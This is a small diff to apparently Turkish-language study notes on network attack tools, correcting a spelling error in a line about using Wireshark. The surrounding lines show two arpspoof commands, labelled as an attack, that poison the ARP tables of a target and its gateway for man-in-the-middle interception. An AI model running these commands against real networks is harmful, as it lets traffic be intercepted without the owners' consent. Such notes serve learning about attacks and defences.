@@ -62,7 +62,7 @@ Nmap, ağ üzerindeki cihazları ve açık servisleri analiz etmek için kullan�
 - > arpspoof -i eth0 -t 10.0.2.6 10.0.2.1 //saldırı
 - > arpspoof -i eth0 -t 10.0.2.1 10.0.2.6 //2 terminalle, hem modeme hem cihaz
 
-wireshark açılıp ağ hareketleri incelenebilir heddef cihazın.
+wireshark açılıp ağ hareketleri incelenebilir hedef cihazın.
 
 ### Bettercap
 
